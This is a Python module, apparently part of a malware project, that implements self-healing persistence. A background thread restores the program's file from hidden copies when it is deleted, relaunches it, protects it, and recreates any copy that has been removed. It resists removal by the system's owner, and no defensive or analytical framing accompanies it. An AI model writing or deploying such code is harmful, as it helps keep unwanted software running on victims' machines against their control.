# modules/watcher.py

import os
import sys
import time
import threading
import subprocess
from modules.persistence import get_system_paths, protect_file

def files_identical(f1, f2):
    try:
        return os.path.exists(f1) and os.path.exists(f2) and os.path.getsize(f1) == os.path.getsize(f2)
    except Exception:
        return False

def watcher_loop(bin_path, persist_paths, interval=10):
    while True:
        # Si el proceso principal desaparece o el archivo principal es borrado...
        if not os.path.exists(bin_path):
            # Busca otra copia válida
            for p in persist_paths:
                if os.path.exists(p) and files_identical(p, bin_path) is False:
                    try:
                        # Restaura el archivo eliminado/corrupto
                        subprocess.run(["cp", p, bin_path], check=True)
                        protect_file(bin_path)
                        # Relanza el proceso principal
                        subprocess.Popen([sys.executable, bin_path])
                        break
                    except Exception:
                        continue
        # Si otra copia desaparece, la re-regenera
        for p in persist_paths:
            if not os.path.exists(p):
                try:
                    subprocess.run(["cp", bin_path, p], check=True)
                    protect_file(p)
                except Exception:
                    continue
        time.sleep(interval)

def start_watcher():
    bin_path = os.path.abspath(sys.argv[0])
    persist_paths = get_system_paths()
    th = threading.Thread(target=watcher_loop, args=(bin_path, persist_paths), daemon=True)
    th.start()
